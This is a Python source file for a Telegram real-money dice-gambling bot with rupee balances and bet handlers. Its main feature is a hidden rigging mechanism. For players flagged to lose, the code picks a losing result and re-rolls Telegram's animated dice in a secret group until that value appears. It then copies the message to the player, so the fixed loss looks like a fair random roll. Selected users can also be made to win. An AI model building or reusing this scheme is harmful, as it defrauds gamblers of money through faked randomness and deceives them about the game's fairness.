import random
import os
import logging
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from bot_instance import bot
from wallet import (
    get_balance,
    adjust_balance,
    reduce_wager_requirement,
    record_bet
)
from settings import get_min_bet, get_max_bet

# Secret Rig Group ID
RIG_GROUP_ID = int(os.getenv("RIG_GROUP_ID", "-1004291076026"))

# --- RIGGING CHECK ---

def get_rigged_target(user_id: int) -> bool | None:
    try:
        from settings import get_user_rig_status
        return get_user_rig_status(user_id)
    except Exception:
        return None

# --- EVALUATION LOGIC ---

def evaluate_dice_outcome(dice_value: int, bet_choice: str) -> tuple[bool, float]:
    choice = str(bet_choice).lower().strip()

    if choice == "high":
        is_win = dice_value in [4, 5, 6]
        return is_win, 1.80 if is_win else 0.0

    elif choice == "low":
        is_win = dice_value in [1, 2, 3]
        return is_win, 1.80 if is_win else 0.0

    elif choice == "even":
        is_win = (dice_value % 2 == 0)
        return is_win, 1.80 if is_win else 0.0

    elif choice == "odd":
        is_win = (dice_value % 2 != 0)
        return is_win, 1.80 if is_win else 0.0

    elif choice in ["1", "2", "3", "4", "5", "6"]:
        is_win = (dice_value == int(choice))
        return is_win, 5.50 if is_win else 0.0

    return False, 0.0

def generate_dice_roll(user_id: int, bet_choice: str) -> int:
    rig_status = get_rigged_target(user_id)

    if rig_status is False:
        losing_outcomes = [v for v in range(1, 7) if not evaluate_dice_outcome(v, bet_choice)[0]]
        if losing_outcomes:
            return random.choice(losing_outcomes)

    elif rig_status is True:
        winning_outcomes = [v for v in range(1, 7) if evaluate_dice_outcome(v, bet_choice)[0]]
        if winning_outcomes:
            return random.choice(winning_outcomes)

    return random.randint(1, 6)

def validate_bet_amount(user_id: int, amount: float) -> tuple[bool, str]:
    min_b = get_min_bet()
    max_b = get_max_bet(user_id)
    user_bal = get_balance(user_id)

    if amount < min_b:
        return False, f"⚠️ Minimum bet is ₹{min_b:.2f}"
    if amount > max_b:
        return False, f"⚠️ Maximum bet is ₹{max_b:.2f}"
    if amount > user_bal:
        return False, f"❌ Insufficient balance! You have ₹{user_bal:.2f}"

    return True, ""

def send_dice_animation(chat_id: int, user_id: int, bet_choice: str) -> int:
    rig_status = get_rigged_target(user_id)

    if rig_status is False:
        try:
            target_val = generate_dice_roll(user_id, bet_choice)
            print(f"DEBUG: Attempting rig roll for user {user_id} in RIG_GROUP_ID: {RIG_GROUP_ID}")

            for i in range(1, 16):
                msg = bot.send_dice(RIG_GROUP_ID, emoji="🎲")
                if msg.dice.value == target_val:
                    print(f"DEBUG: Target dice value {target_val} hit on attempt {i}!")
                    bot.copy_message(chat_id, RIG_GROUP_ID, msg.message_id)
                    return target_val

        except Exception as e:
            # Prints full raw exception directly in Termux console
            print(f"❌ [RIG ERROR] Failed to send dice to group {RIG_GROUP_ID}: {e}")
            logging.error(f"RIG GROUP ERROR: {e}", exc_info=True)

    msg = bot.send_dice(chat_id, emoji="🎲")
    return msg.dice.value

# --- INLINE KEYBOARD UI ---

def get_bet_selection_keyboard(amount: float) -> InlineKeyboardMarkup:
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔴 High (4-6) [1.8x]", callback_data=f"dr_{amount}_high"),
        InlineKeyboardButton("🔵 Low (1-3) [1.8x]", callback_data=f"dr_{amount}_low"),
        InlineKeyboardButton("🟣 Even [1.8x]", callback_data=f"dr_{amount}_even"),
        InlineKeyboardButton("🟡 Odd [1.8x]", callback_data=f"dr_{amount}_odd"),
    )
    num_buttons = [InlineKeyboardButton(f"🎲 {i} [5.5x]", callback_data=f"dr_{amount}_{i}") for i in range(1, 7)]
    markup.add(*num_buttons)
    return markup

def send_dr_guide(message: Message):
    guide_text = (
        "🎲 <b>Dice Roll (/dr) Guide</b>\n\n"
        "<b>Usage:</b>\n"
        "• <code>/dr &lt;amount&gt; &lt;choice&gt;</code> — Bet directly\n"
        "• <code>/dr &lt;amount&gt;</code> — Open inline bet selection\n"
        "• <code>/dr</code> — Show this guide\n\n"
        "<b>Choices & Payouts:</b>\n"
        "• <code>high</code> (4-6) → <b>1.80x</b>\n"
        "• <code>low</code> (1-3) → <b>1.80x</b>\n"
        "• <code>even</code> (2, 4, 6) → <b>1.80x</b>\n"
        "• <code>odd</code> (1, 3, 5) → <b>1.80x</b>\n"
        "• <code>1-6</code> → <b>5.50x</b>\n\n"
        "<b>Aliases:</b> /diceroll"
    )
    bot.reply_to(message, guide_text, parse_mode="HTML")

# --- GAME EXECUTION ---

def process_dice_bet(chat_id: int, user_id: int, amount: float, choice: str, reply_to_id: int = None):
    valid, err_msg = validate_bet_amount(user_id, amount)
    if not valid:
        bot.send_message(chat_id, err_msg, reply_to_message_id=reply_to_id)
        return

    adjust_balance(user_id, -amount)
    dice_val = send_dice_animation(chat_id, user_id, choice)

    is_win, multiplier = evaluate_dice_outcome(dice_val, choice)
    payout = amount * multiplier if is_win else 0.0

    if is_win:
        adjust_balance(user_id, payout)
        res_msg = (
            f"⚡ <b>Dice Roll (DR) • ₹{amount:.2f}</b>\n\n"
            f"🎯 <b>Choice:</b> {choice.upper()}\n"
            f"🎲 <b>Outcome:</b> {dice_val}\n\n"
            f"🎉 <b>You Won ₹{payout:.2f}!</b>"
        )
    else:
        reduce_wager_requirement(user_id, amount)
        res_msg = (
            f"⚡ <b>Dice Roll (DR) • ₹{amount:.2f}</b>\n\n"
            f"🎯 <b>Choice:</b> {choice.upper()}\n"
            f"🎲 <b>Outcome:</b> {dice_val}\n\n"
            f"❌ <b>You Lost ₹{amount:.2f}</b>"
        )

    record_bet(
        telegram_id=user_id,
        game="dice_roll",
        bet_amount=amount,
        payout=payout,
        result="WIN" if is_win else "LOSE",
        meta={"choice": choice, "rolled": dice_val}
    )

    bot.send_message(chat_id, res_msg, reply_to_message_id=reply_to_id, parse_mode="HTML")

# --- COMMAND HANDLERS ---

@bot.message_handler(commands=["dr", "diceroll"])
def handle_dr_command(message: Message):
    parts = message.text.split()

    if len(parts) == 1:
        send_dr_guide(message)
        return

    user_id = message.from_user.id
    try:
        from wallet import resolve_amount
        amount = resolve_amount(user_id, parts[1])
    except Exception:
        try:
            amount = float(parts[1])
        except ValueError:
            amount = None

    if amount is None or amount <= 0:
        bot.reply_to(message, "❌ Invalid bet amount.")
        return

    valid, err_msg = validate_bet_amount(user_id, amount)
    if not valid:
        bot.reply_to(message, err_msg)
        return

    if len(parts) == 2:
        kb = get_bet_selection_keyboard(amount)
        bot.reply_to(message, f"🎲 <b>Place your bet for ₹{amount:.2f}:</b>", reply_markup=kb, parse_mode="HTML")
        return

    choice = parts[2].lower().strip()
    if choice not in ["high", "low", "even", "odd", "1", "2", "3", "4", "5", "6"]:
        bot.reply_to(message, "❌ Invalid choice! Pick high, low, even, odd, or 1-6.", parse_mode="HTML")
        return

    process_dice_bet(message.chat.id, user_id, amount, choice, reply_to_id=message.message_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("dr_"))
def handle_dr_callback(call: CallbackQuery):
    user_id = call.from_user.id
    parts = call.data.split("_")

    if len(parts) < 3:
        bot.answer_callback_query(call.id, "Invalid action.")
        return

    try:
        amount = float(parts[1])
        choice = parts[2]
    except ValueError:
        bot.answer_callback_query(call.id, "Invalid data.")
        return

    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception:
        pass

    process_dice_bet(call.message.chat.id, user_id, amount, choice)

# --- BACKWARD COMPATIBILITY ALIASES ---
play_dice_roll = process_dice_bet
handle_dice_roll = handle_dr_command
